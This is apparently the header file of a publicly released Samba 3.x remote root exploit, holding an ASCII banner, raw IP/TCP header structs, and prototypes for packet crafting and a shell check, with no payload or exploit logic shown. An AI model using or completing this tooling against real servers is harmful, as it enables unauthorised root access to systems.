/*
 .oooooo..o                              .o8                 oooo       ooooo ooooo ooooo
d8P'    `Y8                             "888                 `888       `888' `888' `888'
Y88bo.       .oooo.   ooo. .oo.  .oo.    888oooo.   .oooo.    888        888   888   888
 `"Y8888o.  `P  )88b  `888P"Y88bP"Y88b   d88' `88b `P  )88b   888        888   888   888
     `"Y88b  .oP"888   888   888   888   888   888  .oP"888   888        888   888   888
oo     .d8P d8(  888   888   888   888   888   888 d8(  888   888        888   888   888
8""88888P'  `Y888""8o o888o o888o o888o  `Y8bod8P' `Y888""8o o888o      o888o o888o o888o

  sambal III: samba 3.x.x remote root exploit                  by eSDee (esdee@netric.org)

*/

#define BACKLOG         10
#define TAG             ".ess"
#define TH_FIN          0x01
#define TH_SYN          0x02
#define TH_RST          0x04
#define TH_ACK          0x10

struct iphdr{
    uint8_t    ihl:4;
    uint8_t    version:4;
    uint8_t    tos;
    uint16_t    tot_len;
    uint16_t    id;
    uint16_t    frag_off;
    uint8_t    ttl;
    uint8_t    protocol;
    uint16_t    check;
    uint32_t    saddr;
    uint32_t    daddr;
};

struct tcphdr{
    uint16_t   th_sport;
    uint16_t   th_dport;
    uint32_t   th_seq;
    uint32_t   th_ack;
    uint8_t    th_x2:4;
    uint8_t    th_off:4;
    uint8_t    th_flags;
    uint16_t   th_win;
    uint16_t   th_sum;
    uint16_t   th_urp;
};

struct pseudohdr  {
    uint32_t   saddr;
    uint32_t   daddr;
    uint8_t    useless;
    uint8_t    protocol;
    uint16_t   tcplength;
};

int netio_connect(const char *hostname, unsigned short port);
int netio_recv(int fd, void *buf, size_t len, int flags);
int netio_send(int fd, void *buf, size_t len, int flags);
int netio_bind_socket(unsigned short port);
int netio_accept(int fd, struct SMB_session *session);
int netio_get_sock(int type);
int netio_recv_packet(int fd, struct sockaddr_in *dest, struct sockaddr_in *from, int delay_val);
int netio_send_packet(int fd, struct sockaddr_in *dest, struct sockaddr_in *from, unsigned char session_flags, unsigned long sequence);
unsigned short in_cksum(uint16_t *addr, int len);
int netio_check_for_shell(int fd);


